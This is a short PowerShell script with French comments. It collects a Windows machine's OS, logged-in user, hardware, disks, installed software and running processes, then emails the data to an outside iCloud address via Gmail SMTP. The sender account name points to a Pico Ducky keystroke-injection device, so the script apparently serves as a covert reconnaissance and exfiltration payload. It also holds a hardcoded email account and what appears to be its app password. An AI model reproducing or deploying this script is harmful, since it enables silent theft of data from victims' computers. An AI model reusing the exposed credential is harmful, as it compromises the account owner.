# Collecte des informations système
$sysInfo = "Système: " + (Get-WmiObject Win32_OperatingSystem).Caption + "n"
$sysInfo += "Utilisateur connecté: " + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name + "n"
$sysInfo += "Processeur: " + (Get-WmiObject Win32_Processor).Name + "n"
$sysInfo += "Mémoire installée: " + (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB + " GBn"
$sysInfo += "Disques: " + (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }).DeviceID + "n"
$sysInfo += "Logiciels installés: " + (Get-WmiObject Win32_Product | Select-Object Name) + "n"
$sysInfo += "Processus en cours: " + (Get-Process | Select-Object Name) + "n"

# Envoi des informations par e-mail via SMTP
$EmailFrom = "picoduckyraspberry@gmail.com"
$EmailTo = "clement14bs@icloud.com"
$Subject = "Données système collectées"
$Body = "Voici les informations système collectées : n" + $sysInfo
$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587
$Password = "derr olzd bjte tupv"

$Message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo, $Subject, $Body
$SMTP = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
$SMTP.EnableSsl = $true
$SMTP.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $Password)
$SMTP.Send($Message)
